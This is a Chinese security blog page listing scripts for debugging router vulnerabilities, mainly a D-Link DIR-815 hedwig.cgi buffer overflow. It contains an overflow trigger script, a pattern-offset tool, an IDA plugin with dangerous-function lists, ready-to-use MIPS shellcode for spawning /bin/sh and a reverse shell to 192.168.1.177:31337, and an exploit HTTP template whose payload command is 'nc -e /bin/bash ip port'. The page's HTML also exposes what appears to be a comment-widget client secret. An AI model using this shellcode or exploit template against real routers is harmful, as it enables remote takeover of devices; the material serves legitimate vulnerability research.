
<!DOCTYPE html>
<html lang="zh-CN" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>路由器漏洞调试相关脚本 - pup2y&#39;s world</title>
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="Fechin,"> 
    <meta name="description" content="前言记录下路由器漏洞调试过程中使用到的一些脚本，该帖子会不断更新的。
qemu用户模式动态调试脚本test.sh（以D-LINK DIR815缓冲区漏洞调试脚本为例）
#/bin/bash
test,"> 
    <meta name="author" content="青云"> 
    <link rel="alternative" href="atom.xml" title="pup2y&#39;s world" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.jpg"> 
    
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">

    
<link rel="stylesheet" href="/css/diaspora.css">

	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <script>
         (adsbygoogle = window.adsbygoogle || []).push({
              google_ad_client: "ca-pub-8691406134231910",
              enable_page_level_ads: true
         });
    </script>
    <script async custom-element="amp-auto-ads"
        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
    </script>
<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>

<body class="loading">
    <span id="config-title" style="display:none">pup2y&#39;s world</span>
    <div id="loader"></div>
    <div id="single">
    <div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://pup2y.github.io"></a>
    <div title="播放/暂停" class="iconfont icon-play"></div>
    <h3 class="subtitle">路由器漏洞调试相关脚本</h3>
    <div class="social">
        <div>
            <div class="share">
                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
            </div>
            <div id="qr"></div>
        </div>
    </div>
    <div class="scrollbar"></div>
</div>

    <div class="section">
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="article">
    <div class='main'>
        <h1 class="title">路由器漏洞调试相关脚本</h1>
        <div class="stuff">
            <span>五月 22, 2020</span>
			
			<span>
   阅读数  <span id="busuanzi_value_page_pv"></span>
</span>
            

        </div>
        <div class="content markdown">
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录下路由器漏洞调试过程中使用到的一些脚本，该帖子会不断更新的。</p>
<h1 id="qemu用户模式动态调试脚本"><a href="#qemu用户模式动态调试脚本" class="headerlink" title="qemu用户模式动态调试脚本"></a>qemu用户模式动态调试脚本</h1><p>test.sh（以D-LINK DIR815缓冲区漏洞调试脚本为例）</p>
<pre class=" language-sh"><code class="language-sh">#/bin/bash
test=$(python -c "print 'uid=1234&password='+'A'*0x600")
LEN=$(echo -n "$test" | wc -c)
PORT="23957"
cp $(which qemu-mipsel-static) ./qemu
sudo chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$test -E REQUEST_URL="/hedwig.cgi" -E REMOTE_ADDR="127.0.0.1" -g $PORT /htdocs/web/hedwig.cgi 2>/dev/null
rm -f ./qemu</code></pre>
<p>-E 指定环境变量，-g 指定调试端口，“2&gt; /dev/null” 代表忽略掉错误提示信息。</p>
<pre class=" language-text"><code class="language-text">2表示标准错误。文件描述符我们常见的就是系统预留的0，1和2这三个，他们的意义分别有如下对应关系： 0,1,2分别代表标准输入，标准输出，标准错误。
‘>‘表示重定向。 
/dev/null是一个特殊的设备文件，这个文件接收到的任何数据都会被丢弃。因此，null这个设备通常也被成为位桶（bit bucket）或黑洞。 </code></pre>
<p>一般要用qemu用户模式进行调试可以通过chroot切换根目录到当前根文件系统下。</p>
<pre class=" language-sh"><code class="language-sh">cp $(which qemu-mipsel-static ) .
sudo chroot . qemu-mipsel-static bin/busybox</code></pre>
<p>或者通过-L 来指定根目录以便程序动态运行时能在根目录下的/lib文件夹中找到动态链接库</p>
<pre class=" language-sh"><code class="language-sh">qemu-mipsel -L . bin/busybox</code></pre>
<h1 id="计算偏移脚本"><a href="#计算偏移脚本" class="headerlink" title="计算偏移脚本"></a>计算偏移脚本</h1><p>patternLocOffset.py</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python2</span>
<span class="token comment" spellcheck="true">#####################################################################################</span>
<span class="token comment" spellcheck="true">## Create pattern strings &amp; location offset</span>
<span class="token comment" spellcheck="true">##</span>
<span class="token comment" spellcheck="true">## Example:</span>
<span class="token comment" spellcheck="true">## C:\Users\Lenov\Desktop> patterLocOffset.py -c -l 260 -f output.txt</span>
<span class="token comment" spellcheck="true">### [*] Create pattern string contains 260 characters ok!</span>
<span class="token comment" spellcheck="true">### [+] output to output.txt ok!</span>
<span class="token comment" spellcheck="true">##</span>
<span class="token comment" spellcheck="true">## C:\Users\Lenov\Desktop> patternLocOffset.py -s 0x41613141 -l 260</span>
<span class="token comment" spellcheck="true">### [*] Create pattern string contains 260 characters ok!</span>
<span class="token comment" spellcheck="true">### [*] Exact match at offset 3</span>
<span class="token comment" spellcheck="true">#</span>
<span class="token comment" spellcheck="true">#####################################################################################</span>

<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> struct
<span class="token keyword">import</span> binascii
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> re

a <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>
b <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz"</span>
c <span class="token operator">=</span> <span class="token string">"0123456789"</span>

<span class="token keyword">def</span> <span class="token function">generate</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span>output<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true">#</span>
    <span class="token comment" spellcheck="true"># pattern create</span>
    codeStr <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">print</span> <span class="token string">'[*] Create pattern string contains %d characters'</span><span class="token operator">%</span>count<span class="token punctuation">,</span>
    timeStart <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>count<span class="token punctuation">)</span><span class="token punctuation">:</span>
        codeStr <span class="token operator">+=</span> a<span class="token punctuation">[</span>i<span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">+</span>b<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">+</span>c<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">10</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span> <span class="token string">'ok!'</span>
    <span class="token keyword">if</span> output<span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">'[+] output to %s'</span><span class="token operator">%</span>output<span class="token punctuation">,</span>
        fw <span class="token operator">=</span> open<span class="token punctuation">(</span>output<span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>
        fw<span class="token punctuation">.</span>write<span class="token punctuation">(</span>codeStr<span class="token punctuation">)</span>
        fw<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> <span class="token string">'ok!'</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> codeStr
    <span class="token keyword">print</span> <span class="token string">"[+] take time: %.4f s"</span><span class="token operator">%</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>timeStart<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">patternMatch</span><span class="token punctuation">(</span>searchCode<span class="token punctuation">,</span> length<span class="token operator">=</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true">#</span>
    <span class="token comment" spellcheck="true"># pattern search</span>
    offset <span class="token operator">=</span> <span class="token number">0</span>
    pattern <span class="token operator">=</span> None

    timeStart <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    is0xHex <span class="token operator">=</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string">'^0x[0-9a-fA-F]{8}'</span><span class="token punctuation">,</span>searchCode<span class="token punctuation">)</span>
    isHex <span class="token operator">=</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string">'^[0-9a-fA-F]{8}'</span><span class="token punctuation">,</span>searchCode<span class="token punctuation">)</span>

    <span class="token keyword">if</span> is0xHex<span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true">#0x41613141</span>
        pattern <span class="token operator">=</span> binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>searchCode<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> isHex<span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true">#41613141</span>
        pattern <span class="token operator">=</span> binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>searchCode<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">'[-] seach Pattern eg:0x41613141'</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    source <span class="token operator">=</span> generate<span class="token punctuation">(</span>length<span class="token punctuation">,</span>None<span class="token punctuation">)</span>
    offset <span class="token operator">=</span> source<span class="token punctuation">.</span>find<span class="token punctuation">(</span>pattern<span class="token punctuation">)</span>

    <span class="token keyword">if</span> offset <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">"[*] Exact match at offset %d"</span><span class="token operator">%</span>offset
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">"[*] No exact matches, looking for likely candidates..."</span>
        reverse <span class="token operator">=</span> list<span class="token punctuation">(</span>pattern<span class="token punctuation">)</span>
        reverse<span class="token punctuation">.</span>reverse<span class="token punctuation">(</span><span class="token punctuation">)</span>
        pattern <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>reverse<span class="token punctuation">)</span>
        offset <span class="token operator">=</span> source<span class="token punctuation">.</span>find<span class="token punctuation">(</span>pattern<span class="token punctuation">)</span>
        <span class="token keyword">if</span> offset <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span> <span class="token string">"[+] Possible match at offset %d (adjusted another-endian)"</span><span class="token operator">%</span>offset
    <span class="token keyword">print</span> <span class="token string">"[+] take time: %.4f s"</span><span class="token operator">%</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>timeStart<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true">## parse argument</span>
    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-s'</span><span class="token punctuation">,</span> <span class="token string">'--search'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'search for pattern'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-c'</span><span class="token punctuation">,</span> <span class="token string">'--create'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'create a pattern'</span><span class="token punctuation">,</span>\
                        action<span class="token operator">=</span><span class="token string">'store_true'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-f'</span><span class="token punctuation">,</span> <span class="token string">'--file'</span><span class="token punctuation">,</span> help<span class="token operator">=</span><span class="token string">'output file name'</span><span class="token punctuation">,</span>\
                        default<span class="token operator">=</span><span class="token string">'patternShell.txt'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-l'</span><span class="token punctuation">,</span> <span class="token string">'--length'</span><span class="token punctuation">,</span>help<span class="token operator">=</span><span class="token string">'length of pattern code'</span><span class="token punctuation">,</span>\
                        type<span class="token operator">=</span>int<span class="token punctuation">,</span>default<span class="token operator">=</span><span class="token number">1024</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#parser.add_argument('-v', dest='verbose', action='store_true')</span>
    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">## save all argument</span>
    length <span class="token operator">=</span> args<span class="token punctuation">.</span>length
    output <span class="token operator">=</span> args<span class="token punctuation">.</span>file
    <span class="token comment" spellcheck="true">#verbose = args.verbose</span>
    createCode <span class="token operator">=</span> args<span class="token punctuation">.</span>create
    searchCode <span class="token operator">=</span> args<span class="token punctuation">.</span>search

    <span class="token keyword">if</span> createCode <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;</span> args<span class="token punctuation">.</span>length <span class="token operator">&lt;=</span> <span class="token number">26</span><span class="token operator">*</span><span class="token number">26</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true">#eg:  -c -l 90</span>
        generate<span class="token punctuation">(</span>length<span class="token punctuation">,</span>output<span class="token punctuation">)</span>
    <span class="token keyword">elif</span> searchCode <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;</span> args<span class="token punctuation">.</span>length <span class="token operator">&lt;=</span> <span class="token number">26</span><span class="token operator">*</span><span class="token number">26</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true">#eg: -s 0x474230141</span>
        patternMatch<span class="token punctuation">(</span>searchCode<span class="token punctuation">,</span>length<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">'[-] You shoud chices from [-c -s]'</span>
        <span class="token keyword">print</span> <span class="token string">'[-] Pattern length must be less than 6760'</span>
        <span class="token keyword">print</span> <span class="token string">'more help: pattern.py -h'</span>
    <span class="token comment" spellcheck="true"># ...</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h1 id="IDA插件"><a href="#IDA插件" class="headerlink" title="IDA插件"></a>IDA插件</h1><p>scanvuln.py</p>
<p>脚本使用：将脚本放置IDA的plugins文件下，在命令行输入scanvuln.find(‘xxx’)查找xxx函数</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> idaapi <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">class</span> <span class="token class-name">scanvulnfinder</span><span class="token punctuation">(</span>idaapi<span class="token punctuation">.</span>plugin_t<span class="token punctuation">)</span><span class="token punctuation">:</span>
    flags <span class="token operator">=</span> <span class="token number">0</span>
    comment <span class="token operator">=</span> <span class="token string">"MIPS vuln Funcs Finder"</span>
    help <span class="token operator">=</span> <span class="token string">""</span>
    wanted_name <span class="token operator">=</span> <span class="token string">"MIPS vuln Funcs Finder"</span>
    wanted_hotkey <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>run<span class="token punctuation">(</span>None<span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">init</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>menu_context <span class="token operator">=</span> idaapi<span class="token punctuation">.</span>add_menu_item<span class="token punctuation">(</span><span class="token string">"Search/"</span><span class="token punctuation">,</span> <span class="token string">"MIPS vulu Funcs Finder"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>run<span class="token punctuation">,</span> <span class="token punctuation">(</span>None<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> idaapi<span class="token punctuation">.</span>PLUGIN_KEEP

    <span class="token keyword">def</span> <span class="token function">term</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        idaapi<span class="token punctuation">.</span>del_menu_item<span class="token punctuation">(</span>self<span class="token punctuation">.</span>menu_context<span class="token punctuation">)</span>
        <span class="token keyword">return</span> None

    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">global</span> scanvuln
        scanvuln <span class="token operator">=</span> scanvuln<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">scanvuln</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">getFuncAddr</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>fname<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> LocByName<span class="token punctuation">(</span>fname<span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">judgeAduit</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""
        not safe function handler
        """</span>
        MakeComm<span class="token punctuation">(</span>addr<span class="token punctuation">,</span><span class="token string">"### AUDIT HERE ###"</span><span class="token punctuation">)</span>
        SetColor<span class="token punctuation">(</span>addr<span class="token punctuation">,</span>CIC_ITEM<span class="token punctuation">,</span><span class="token number">0x0000ff</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#set background red</span>

    <span class="token keyword">def</span> <span class="token function">find</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>funcname<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">"""
        not safe function finder
        """</span>
        count <span class="token operator">=</span><span class="token number">0</span>
        fAddr <span class="token operator">=</span> self<span class="token punctuation">.</span>getFuncAddr<span class="token punctuation">(</span>funcname<span class="token punctuation">)</span>
        func <span class="token operator">=</span> get_func<span class="token punctuation">(</span>fAddr<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token operator">not</span> func <span class="token keyword">is</span> None<span class="token punctuation">:</span>
            fname <span class="token operator">=</span> Name<span class="token punctuation">(</span>func<span class="token punctuation">.</span>startEA<span class="token punctuation">)</span>
            items <span class="token operator">=</span> FuncItems<span class="token punctuation">(</span>func<span class="token punctuation">.</span>startEA<span class="token punctuation">)</span>
            <span class="token keyword">for</span> i <span class="token keyword">in</span> items<span class="token punctuation">:</span>
                <span class="token keyword">for</span> xref <span class="token keyword">in</span> XrefsTo<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    <span class="token keyword">if</span> xref<span class="token punctuation">.</span>type <span class="token operator">==</span> fl_CN <span class="token operator">or</span> xref<span class="token punctuation">.</span>type <span class="token operator">==</span>fl_CF<span class="token punctuation">:</span>
                        count<span class="token operator">+=</span><span class="token number">1</span>
                        Message<span class="token punctuation">(</span><span class="token string">"|    %s[%d]   calls 0x%08x  from => %08x     |\n"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>fname<span class="token punctuation">,</span>count<span class="token punctuation">,</span>xref<span class="token punctuation">.</span>frm<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
                        self<span class="token punctuation">.</span>judgeAduit<span class="token punctuation">(</span>xref<span class="token punctuation">.</span>frm<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            Warning<span class="token punctuation">(</span><span class="token string">"NO function named '%s' found at location %x"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>funcname<span class="token punctuation">,</span>fAddr<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">PLUGIN_ENTRY</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> scanvulnfinder<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>MIPS静态汇编审计辅助脚本： <a href="https://github.com/giantbranch/mipsAudit" target="_blank" rel="noopener">https://github.com/giantbranch/mipsAudit</a> </p>
<pre class=" language-c"><code class="language-c">dangerous_functions <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">"strcpy"</span><span class="token punctuation">,</span> 
    <span class="token string">"strcat"</span><span class="token punctuation">,</span>  
    <span class="token string">"sprintf"</span><span class="token punctuation">,</span>
    <span class="token string">"read"</span><span class="token punctuation">,</span> 
    <span class="token string">"getenv"</span>    
<span class="token punctuation">]</span>

attention_function <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">"memcpy"</span><span class="token punctuation">,</span>
    <span class="token string">"strncpy"</span><span class="token punctuation">,</span>
    <span class="token string">"sscanf"</span><span class="token punctuation">,</span> 
    <span class="token string">"strncat"</span><span class="token punctuation">,</span> 
    <span class="token string">"snprintf"</span><span class="token punctuation">,</span>
    <span class="token string">"vprintf"</span><span class="token punctuation">,</span> 
    <span class="token string">"printf"</span>
<span class="token punctuation">]</span>

command_execution_function <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">"system"</span><span class="token punctuation">,</span> 
    <span class="token string">"execve"</span><span class="token punctuation">,</span>
    <span class="token string">"popen"</span><span class="token punctuation">,</span>
    <span class="token string">"unlink"</span>
<span class="token punctuation">]</span></code></pre>
<h1 id="mips-shellcode"><a href="#mips-shellcode" class="headerlink" title="mips shellcode"></a>mips shellcode</h1><p>可以参考以下两个网站：</p>
<p><a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a><br><a href="https://www.exploit-db.com/exploits/45541" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/45541</a></p>
<p>比较常用的有</p>
<p>执行execve(‘/bin/sh’)</p>
<pre class=" language-sh"><code class="language-sh"># Linux/MIPS - execve /bin/sh - 48 bytes
shellcode = "\xff\xff\x06\x28"   # slti $a2, $zero, -1
shellcode += "\x62\x69\x0f\x3c"  # lui $t7, 0x6962
shellcode += "\x2f\x2f\xef\x35"  # ori $t7, $t7, 0x2f2f
shellcode += "\xf4\xff\xaf\xaf"  # sw $t7, -0xc($sp)
shellcode += "\x73\x68\x0e\x3c"  # lui $t6, 0x6873
shellcode += "\x6e\x2f\xce\x35"  # ori $t6, $t6, 0x2f6e
shellcode += "\xf8\xff\xae\xaf"  # sw $t6, -8($sp)
shellcode += "\xfc\xff\xa0\xaf"  # sw $zero, -4($sp)
shellcode += "\xf4\xff\xa4\x27"  # addiu $a0, $sp, -0xc
shellcode += "\xff\xff\x05\x28"  # slti $a1, $zero, -1
shellcode += "\xab\x0f\x02\x24"  # addiu;$v0, $zero, 0xfab
shellcode += "\x0c\x01\x01\x01"  # syscall 0x40404</code></pre>
<p>反弹shell的<a href="http://shell-storm.org/shellcode/files/shellcode-860.php" target="_blank" rel="noopener">shellcode</a>，需要自己找到IP地址并更改，192.168.1.177其中192.168是连在一起的，对应的十六进制是\xc0\xa8。1.177对应的十六进制是\x01\xb1。</p>
<pre class=" language-sh"><code class="language-sh">#Linux/mips - Reverse Shell Shellcode - 200 bytes
shellcode = ""
shellcode += "\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28"
shellcode += "\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
shellcode += "\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
shellcode += "\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01"
shellcode += "\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24"
shellcode += "\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20"
#shellcode += "\xf8\xff\xa5\xaf\x01\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"#192.168.1.177:31337
shellcode += "\xf8\xff\xa5\xaf\x4f\xb1\x80\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"
shellcode += "\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24"
shellcode += "\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf"
shellcode += "\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28"
shellcode += "\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23"
shellcode += "\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28"
shellcode += "\xab\x0f\x02\x24\x0c\x09\x09\x01"</code></pre>
<p>其实为了方便不用修改端口，因为端口31337（0x7a69）更改需要修下面汇编代码中的0x6979和0xFF01。</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#Socket FD is already in a0</span>
    #<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
    <span class="token macro property">#Connect sockaddr</span>
    lui $a1<span class="token punctuation">,</span> <span class="token number">0x6979</span> #Port<span class="token punctuation">:</span>
    ori $a1<span class="token punctuation">,</span> <span class="token number">0xFF01</span> #<span class="token number">31337</span>
    addi $a1<span class="token punctuation">,</span> $a1<span class="token punctuation">,</span> <span class="token number">0x0101</span>
    sw $a1<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token function">8</span><span class="token punctuation">(</span>$sp<span class="token punctuation">)</span>

    li $a1<span class="token punctuation">,</span> <span class="token number">0xB101A8C0</span> #<span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.177</span>
    sw $a1<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token function">4</span><span class="token punctuation">(</span>$sp<span class="token punctuation">)</span>
    addi $a1<span class="token punctuation">,</span> $sp<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">8</span></code></pre>
<h1 id="HTTP报文模版"><a href="#HTTP报文模版" class="headerlink" title="HTTP报文模版"></a>HTTP报文模版</h1><pre class=" language-py"><code class="language-py">#!/usr/bin/python2
from pwn import *
import requests
import sys

def getpayload(offset ,libc_base, cmd):
    payload = xxx

    return payload

if _name__=="__main__":

    cmd = 'nc -e /bin/bash ip port'
    cookie = getpayload(offset, libc_base, cmd)

    header = {
        'cookie'        :cookie
        'Content-Type'    :
        'Content-Length':
        'xxxx'            :
    }

    data = {'xxx':'xxxx'}
    ip_port = sys.argv[1]
    url = "http://" + ip_port + "/file"
    r = requests.post( url = url, headers = header, data = data)
    print r
</code></pre>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>
            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
                <source type="audio/mpeg" src="">
            </audio>
            
                <ul id="audio-list" style="display:none">
                    
                        
                            <li title='0' data-url='http://music.163.com/song?id=441532&userid=258169074'></li>
                        
                    
                        
                            <li title='1' data-url='https://link.hhtjim.com/163/26584453.mp3'></li>
                        
                    
                        
                            <li title='2' data-url='https://link.hhtjim.com/163/28245304.mp3'></li>
                        
                    
                </ul>
            
        </div>
        
    <div id='gitalk-container' class="comment link"
		data-enable='true'
        data-ae='true'
        data-ci='177c577b486a2fd2b061'
        data-cs='ce4ec96a3a9f14b35d6e9d750e1d7f231c22db0e'
        data-r='pup2y.github.io'
        data-o='pup2y'
        data-a='pup2y'
        data-d='true'
    >查看评论</div>


    </div>
    
        <div class='side'>
